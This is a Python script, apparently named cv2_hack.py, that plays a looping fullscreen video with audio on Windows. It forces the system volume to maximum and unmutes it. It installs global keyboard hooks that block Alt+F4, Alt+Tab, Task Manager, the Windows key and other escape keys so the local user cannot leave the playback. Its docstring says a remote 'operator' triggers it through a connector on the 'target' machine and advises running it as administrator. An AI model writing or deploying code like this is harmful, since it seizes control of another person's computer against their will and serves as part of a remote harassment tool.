"""Fullscreen OpenCV video player with pygame audio (Windows volume via pycaw).

When ``lock_keyboard`` is true (default), common system and window-manager keys
are suppressed via the ``keyboard`` package so the local user cannot easily
bypass fullscreen with the keyboard. Deploy / stop are driven from the
**operator** (server) via the control channel, not local hotkeys here.

This is not absolute: Ctrl+Alt+Del, power events, and other host protections are
OS-level and cannot be disabled from user code.

Intended to be started by ``target/connector.py`` on PLAY commands, or run
manually for testing:

    python cv2_hack.py --video giraffe_clipped.mp4 --audio giraffe_clipped_audio.mp3

On Windows, global hooks often require **Run as administrator** for full effect.
"""

from __future__ import annotations

import argparse
import os
import sys
from contextlib import contextmanager
from typing import Iterator

import cv2
import pygame
from pycaw.pycaw import AudioUtilities


def _set_master_volume_full() -> None:
    """Unmute and set default endpoint volume to 100% (Windows COM)."""
    device = AudioUtilities.GetSpeakers()
    volume = device.EndpointVolume
    volume.SetMute(0, None)
    volume.SetMasterVolumeLevelScalar(1.0, None)


@contextmanager
def _keyboard_lock_context(lock_keyboard: bool) -> Iterator[None]:
    """Optionally install global key suppression while the player runs.

    Args:
        lock_keyboard: If True, block typical escape / OS shortcut keys.

    Yields:
        None.
    """
    if not lock_keyboard:
        yield
        return

    try:
        import keyboard
    except ImportError:
        print(
            "warning: keyboard package not installed; key lock disabled. "
            "pip install keyboard",
            file=sys.stderr,
        )
        yield
        return

    blocked: list[str] = []
    try:
        for combo in (
            "alt+f4",
            "ctrl+shift+esc",
            "ctrl+escape",
            "alt+tab",
            "alt+esc",
            "windows+tab",
            "windows+d",
            "windows+m",
        ):
            try:
                keyboard.add_hotkey(combo, lambda: None, suppress=True)
            except Exception:
                pass

        for name in (
            "esc",
            "tab",
            "f4",
            "windows",
            "left windows",
            "right windows",
        ):
            try:
                keyboard.block_key(name)
                blocked.append(name)
            except Exception:
                pass

        yield
    finally:
        for name in blocked:
            try:
                keyboard.unblock_key(name)
            except Exception:
                pass
        try:
            keyboard.unhook_all()
        except Exception:
            pass


def run_player(
    video_path: str,
    audio_path: str,
    *,
    lock_keyboard: bool = True,
) -> None:
    """Play ``video_path`` fullscreen while playing ``audio_path`` (loops in sync).

    Args:
        video_path: Path to a video file readable by OpenCV.
        audio_path: Path to an extracted audio track (e.g. MP3).
        lock_keyboard: If True, suppress common exit / OS shortcut keys (Windows).

    Raises:
        FileNotFoundError: If either path is missing.
        RuntimeError: If OpenCV cannot open the video.
    """
    if not os.path.isfile(video_path):
        raise FileNotFoundError(f"video not found: {video_path}")
    if not os.path.isfile(audio_path):
        raise FileNotFoundError(f"audio not found: {audio_path}")

    _set_master_volume_full()

    pygame.mixer.init()
    pygame.mixer.music.load(audio_path)

    cap = cv2.VideoCapture(video_path)
    if not cap.isOpened():
        cap.release()
        raise RuntimeError(f"cannot open video: {video_path}")

    cv2.namedWindow("Player", cv2.WINDOW_NORMAL)
    cv2.setWindowProperty("Player", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
    cv2.waitKey(1)

    pygame.mixer.music.play(-1)

    with _keyboard_lock_context(lock_keyboard):
        try:
            while cap.isOpened():
                ret, frame = cap.read()
                if not ret:
                    cap.set(cv2.CAP_PROP_POS_FRAMES, 0)
                    pygame.mixer.music.stop()
                    pygame.mixer.music.rewind()
                    pygame.mixer.music.play(-1)
                    continue

                cv2.imshow("Player", frame)
                cv2.setWindowProperty(
                    "Player", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN
                )
                cv2.waitKey(25)
        finally:
            cap.release()
            cv2.destroyAllWindows()
            pygame.mixer.music.stop()
            pygame.mixer.quit()


def main(argv: list[str] | None = None) -> int:
    """Parse CLI arguments and start the player."""
    parser = argparse.ArgumentParser(description="OpenCV + pygame fullscreen player.")
    parser.add_argument("--video", required=True, help="path to video file")
    parser.add_argument("--audio", required=True, help="path to audio file (e.g. MP3)")
    parser.add_argument(
        "--allow-keyboard",
        action="store_true",
        help="do not install global key lock (for debugging)",
    )
    args = parser.parse_args(argv)

    try:
        run_player(
            os.path.abspath(args.video),
            os.path.abspath(args.audio),
            lock_keyboard=not args.allow_keyboard,
        )
    except (FileNotFoundError, RuntimeError) as exc:
        print(exc, file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
